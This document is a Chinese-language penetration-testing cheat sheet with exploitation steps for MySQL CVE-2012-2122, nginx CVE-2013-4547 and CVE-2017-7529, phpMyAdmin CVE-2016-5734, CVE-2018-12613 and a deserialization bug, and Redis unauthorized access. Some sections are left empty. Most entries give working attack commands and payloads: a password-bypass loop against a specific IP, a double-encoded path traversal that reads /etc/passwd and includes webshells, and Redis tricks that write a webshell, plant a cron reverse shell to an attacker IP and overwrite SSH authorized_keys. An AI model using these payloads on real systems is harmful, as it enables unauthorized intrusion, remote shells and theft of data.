# mysql

## CVE-2012-2122

**漏洞成因：**

当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。 穷举256次用户密码，便能成功登录Mysql服务器。

**利用方式一：**

运行bash命令，穷举密码

```bash
for i in `seq 1 1000`; do mysql -uroot -pwrong -h 1.1.1.1 -P3306 ; done
```

**利用方式二：**

python脚本

```python
#!/usr/bin/python
import subprocess

while 1:
	subprocess.Popen("mysql -u root --password=blah -h193.112.81.168", shell=True).wait()

```

**利用方式三：**

MSF

```
use mysql_authbypass_hashdump
```

**受影响的mysql版本：**

- MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not
- MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.



# nginx

## CVE-2013-4547

**漏洞成因：**

主要原因是错误地解析了请求的URI

```nginx.conf
location ~ \.php$ {
    include        fastcgi_params;

    fastcgi_pass   127.0.0.1:9000;
    fastcgi_index  index.php;
    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;
    fastcgi_param  DOCUMENT_ROOT /var/www/html;
}
```

正常情况下（关闭pathinfo的情况下），Nginx匹配到.php结尾的请求，就发送给fastcgi进行解。而存在CVE-2013-4547的情况下，我们请求 `1.gif[0x20][0x00].php` ，这个URI可以匹配上正则 `.php$`，可以进入这个location块；但进入后，由于fastcgi在查找文件时**被`\0`截断**，Nginx却错**误地认为**请求的文件是`1.gif[0x20]`，就设置其为SCRIPT_FILENAME的值发送给fastcgi。fastcgi根据SCRIPT_FILENAME的值进行解析，最后造成了解析漏洞。

所以，我们只需要上传一个空格结尾的文件，即可使PHP解析。

漏洞可导致目录跨越及代码执行

**利用方式：**

构造文件nginx.jpg上传

```php
<?php phpinfo();?>
```

构造URI

```URL
http://193.112.81.168:8080/uploadfiles/nginx.jpg  .php
```

抓包，后面两个空格\[0x20][0x20]--->\[0x20][0x00]，空格不需要URL编码

发包发现php已解析成功

**受影响的版本：**

- Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7



## CVE-2017-7529

**漏洞成因：**

对请求头中Range头处理不当造成。Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括`“文件头”+“HTTP返回包头”+“HTTP返回包体”`。如果**二次请求命中了该缓存文件**，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。如果我们的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600,  -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。当Nginx服务器使用代理缓存的情况下，攻击者通过利用该漏洞可以拿到服务器的后端真实IP。

**利用方式：**

```python 
python3 poc.py ip
```

**受影响的版本：**

- Nginx 0.5.6 - 1.13.2



## insecure-configuration

**漏洞成因：**

nginx错误配置导致的漏洞

### CRLF注入



**利用方式：**











**受影响的版本：**





# phpmyadmin

## CVE-2016-5734

**漏洞成因：**

`preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )`

在PHP 5.4.7之前的版本，`preg_replace`函数第一个参数可用`\0`进行阶段，并将正则模式修改为e。e模式的正则支持执行代码，可构造任意代码执行

```php
<?php
$pattern = "/(test)/e";
$replacement = "phpinfo();";
$subject = "hello test";

var_dump(preg_replace($pattern, $replacement, $subject));
?>
```

**受影响的phpmyadmin版本：**

- 4.0.10.16前的4.0.x
- 4.4.15.7前的4.4.x
- 4.6.3前的4.6.x（该版本需要PHP5.5+，所以无法复现）



## CVE-2018-12613

**漏洞成因：**

```php
//index.php 50-63
$target_blacklist = array ('import.php', 'export.php');

if (! empty($_REQUEST['target'])
    && is_string($_REQUEST['target'])
    && ! preg_match('/^index/', $_REQUEST['target'])
    && ! in_array($_REQUEST['target'], $target_blacklist)
    && Core::checkPageValidity($_REQUEST['target'])
) {
    include $_REQUEST['target'];
    exit;
}
```

if有五个判断，关键看最后两个

**no.1：**判断target的值是否是$target_blacklist中的值，只要不是则true

**no.2：**调用Core类的checkPageValidity函数验证target，让函数返回值为true才能include

```php
//libraries/classes/Core.php 443-476
public static function checkPageValidity(&$page, array $whitelist = [])
    {
        if (empty($whitelist)) {
            $whitelist = self::$goto_whitelist;
        }
        if (! isset($page) || !is_string($page)) {
            return false;
        }

        if (in_array($page, $whitelist)) {
            return true;
        }

        $_page = mb_substr(
            $page,
            0,
            mb_strpos($page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        $_page = urldecode($page);
        $_page = mb_substr(
            $_page,
            0,
            mb_strpos($_page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        return false;
    }
//31-80
public static $goto_whitelist = array(
        'db_datadict.php',
        'db_sql.php',
        'db_events.php',
        'db_export.php',
    	'index.php',
        .......
        'user_password.php',
    );
```

checkPageValidity函数有五个if判断

1. 如果传入的$whitelist为空则引用静态声明的$goto_whitelist

> $goto_whitelist定义了一些可合法引用的文件名

2. 如果$page未定义或者不是字符串则返回false

> 从$goto_whitelist中引用必满足条件返回true

3. 如果$page在$whitelist中则返回true

> $page即target的值，直接验证是否在$whitelist中，无法利用

4. 如果$_page在$whitelist中则返回true

> 获取第一个问号前的字符串赋给$_page再判断是否在$whitelist中，防止target的值后面再跟参数的情况，这里不能绕过的原因是问号后面的内容会被当做$\_page的参数，比如db_sql.php?/../../../../../../etc/passwd，在PHP中，把`?`后面的内容作为`db_sql.php`中的参数，而我们需要把后面的内容作为`index.php`中target参数的值，所以这里不能绕过

5. 经过urldecode函数解码后的$_page在$whitelist中则返回true

> 将$page参数url解码后再以问号分隔取出前面的值再判断，该漏洞就是出现在urldecode()这个函数中，我们可以通过**url二次编码**绕过。上一个判断不能绕过白名单的原因就是`?`的缘故，这里用url编码的方式对问号进行编码，这样PHP就不知道这是个问号，就当成了target的值。
>
> 浏览器自动URL解码一次，urlcode函数再将$page解码后就是`index.php?target=db_sql.php?/../../../../../etc/passwd` 再以?分割取出来前面的字符串为index.php，$whitelist中有index.php所以会进入最后一个if区间return true

综上，可以构造payload : `index.php?target=db_sql.php%253f/../../../../../etc/passwd`

直接读取到了账户信息

**利用方式一：**

1. 登录phpmyadmin，创建一个数据库，字段为一句话木马
2. 查询生成文件的绝对路径`show variables like '%datadir%';`
3. 此时`data路径+库名`下会生成一个文件`table_name.frm`里面存在一句话木马
4. 访问`http://193.112.81.168:8080/index.php?target=db_datadict.php%253f/../../../../../../var/lib/mysql/test/test/frm`，cmd为连接密码

**利用方式二：**

1. 利用phpinfo()查看session文件存放路径，搜索save_path
2. 执行sql语句，生成一句话木马
3. 在cookie中找到session
4. 包含session文件，`http://193.112.81.168:8080/index.php?target=db_datadict.php%253f/../../../../../../save_path/sess_yoursession`，连接木马

**受影响的phpmyadmin版本：**

- 4.8.0
- 4.8.1



## WooYun-2016-199433

**漏洞成因：**

在scripts/setup.php页面中，通过控制对象中的变量值，造成反序列化漏洞

```php
//var/www/html/scripts/setup.php  10-32
require_once('./libraries/common.lib.php');

// Grab configuration defaults
$PMA_Config = new PMA_Config();

// Script information
$script_info = 'phpMyAdmin ' . $PMA_Config->get('PMA_VERSION') . ' setup script by Michal Čihař <michal@cihar.com>';
$script_version = '$Id$';

// Grab action
if (isset($_POST['action'])) {
    $action = $_POST['action'];
} else {
    $action = '';
}

if (isset($_POST['configuration']) && $action != 'clear' ) {
    // Grab previous configuration, if it should not be cleared
    $configuration = unserialize($_POST['configuration']);
} else {
    // Start with empty configuration
    $configuration = array();
}
```

PMA_Config()这个类中有source变量，控制source，传入路径，反序列化后可读取文件

```php
//EXP
<?php
Class PMA_Config{
	public $source='../../../etc/passwd';
}
$a = new PMA_Config();
echo serialize($a);

//O:10:"PMA_Config":1:{s:6:"source";s:19:"../../../etc/passwd";}
```

POST传参

```php
POST /scripts/setup.php HTTP/1.1
.....
.....
action=test&configuration=O:10:"PMA_Config":1:{s:6:"source";s:19:"../../../etc/passwd";}
```

**受影响的phpmyadmin版本：**

- 2.x



# redis

## Redis 4.x/5.x 未授权访问

**漏洞成因：**

- Redis绑定在0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网

- 没有设置密码认证（默认为空）或者弱密码，可以免密码登录redis服务

**利用方式一：**

利用Redis自身的提供的config命令，写入webshell到网站根目录

```bash
wget http://download.redis.io/releases/redis-2.8.17.tar.gz
tar -zxvf redis-2.8.17.tar.gz && cd redis-2.8.17
make
cd src
#进入交互
./redis-cli -h redis-ip -p 6379
config set dir /var/www/html
config set dbfilename redis.php
(key *)
set x "\r\n\r\n<?php phpinfo();?>\r\n\r\n"
save
```

**工具：https://github.com/n0b0dyCN/redis-rogue-server.git**

**利用方式二：**

nc反弹，写入定时任务执行命令反弹shell

```bash
nc -lvvp 8888
#进入交互
./redis-cli -h redis-ip -p 6379
set xx "\n\n* * * * * bash -i >& /dev/tcp/攻击机ip/8888 0>&1\n\n"
config set dir /var/spool/cron/
config set dbfilename root
save
```

**利用方式三：**

写入ssh公钥用ssh登录

```bash
ssh-ketgen -t rsa
(echo -e"\n";cat id_rsa.pub;echo -e "\n")>key.txt
cat key.txt | ./redis-cli -h redis-ip -x set crack
#进入交互
config get dir	#获取redis备份路径
config set dir /root/.ssh	#更改redis备份路径为ssh公钥存放目录
config set dbfilename authorized_keys	#设置上传公钥的备份文件名字为authorized_keys
save
```

**修复：**

- 设置密码
- 防火墙限定禁止外网ip访问redis服务器

**受影响的redis版本：**

- 2.x
- 3.x

- 4.x
- 5.x



# struts2

## s2-001

**漏洞成因：**







**利用方式一：**







**受影响的版本：**













#

##

**漏洞成因：**







**利用方式一：**







**受影响的版本：**



